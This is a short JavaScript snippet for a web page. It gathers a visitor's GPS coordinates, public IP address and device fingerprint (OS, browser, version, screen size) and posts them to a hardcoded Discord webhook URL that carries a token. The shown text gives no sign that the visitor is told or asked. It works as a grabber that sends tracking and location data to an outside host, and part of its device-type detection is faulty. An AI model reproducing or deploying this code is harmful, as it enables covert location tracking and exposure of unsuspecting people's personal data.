// Replace with your Discord Webhook URL
const webhookUrl =
  "https://discord.com/api/webhooks/1284192212942323772/r3U05UUHWW6KAOD_T1rqzbnUPoXPUPL2LPA-QaLsD_rR3B2EujmWHWjuQp7yz3q61AQl";

// Get visitor's GPS coordinates
navigator.geolocation.getCurrentPosition((position) => {
  const latitude = position.coords.latitude;
  const longitude = position.coords.longitude;

  // Get visitor's IP address
  fetch("https://api.ipify.org?format=json")
    .then((response) => response.json())
    .then((data) => {
      const ipAddress = data.ip;

      // Get device-related information
      const deviceInfo = getDeviceInfo();

      // Send data to Discord Webhook
      const payload = {
        content: `
          Visitor's IP: ${ipAddress}\n
          Latitude: ${latitude}\n
          Longitude: ${longitude}\n
          Device Type: ${deviceInfo.deviceType}\n
          Operating System: ${deviceInfo.os}\n
          Browser: ${deviceInfo.browser}\n
          Browser Version: ${deviceInfo.browserVersion}\n
          Screen Resolution: ${deviceInfo.screenResolution}\n
          Device Screen Width: ${deviceInfo.screenWidth}\n
          Device Screen Height: ${deviceInfo.screenHeight}\n
          Device Pixel Ratio: ${deviceInfo.devicePixelRatio}
        `,
      };

      fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      })
        .then((response) => console.log(response))
        .catch((error) => console.error(error));
    })
    .catch((error) => console.error(error));
});

// Function to get device-related information
function getDeviceInfo() {
  const deviceInfo = {};

  // Device type
  deviceInfo.deviceType = getDeviceType();

  // Operating System
  deviceInfo.os = getOS();

  // Browser type and version
  deviceInfo.browser = getBrowser();
  deviceInfo.browserVersion = getBrowserVersion();

  // Screen resolution
  deviceInfo.screenResolution = `${window.screen.width}x${window.screen.height}`;

  // Device screen width and height
  deviceInfo.screenWidth = window.innerWidth;
  deviceInfo.screenHeight = window.innerHeight;

  // Device pixel ratio
  deviceInfo.devicePixelRatio = window.devicePixelRatio;

  return deviceInfo;
}

// Helper functions to get device-related information
function getDeviceType() {
  if (window.orientation === undefined) {
    return "desktop";
  } else if (window.orientation === 0 || window.orientation === 180) {
    return "tablet";
  } else {
    return "mobile";
  }
}

function getOS() {
  const userAgent = window.navigator.userAgent;
  if (userAgent.includes("Windows")) {
    return "Windows";
  } else if (userAgent.includes("Mac OS")) {
    return "macOS";
  } else if (userAgent.includes("Linux")) {
    return "Linux";
  } else {
    return "Unknown";
  }
}

function getBrowser() {
  const userAgent = window.navigator.userAgent;
  if (userAgent.includes("Chrome")) {
    return "Chrome";
  } else if (userAgent.includes("Firefox")) {
    return "Firefox";
  } else if (userAgent.includes("Safari")) {
    return "Safari";
  } else {
    return "Unknown";
  }
}

function getBrowserVersion() {
  const userAgent = window.navigator.userAgent;
  const match = userAgent.match(/(Chrome|Firefox|Safari)\/([0-9.]+)/);
  if (match) {
    return match[2];
  } else {
    return "Unknown";
  }
}

//
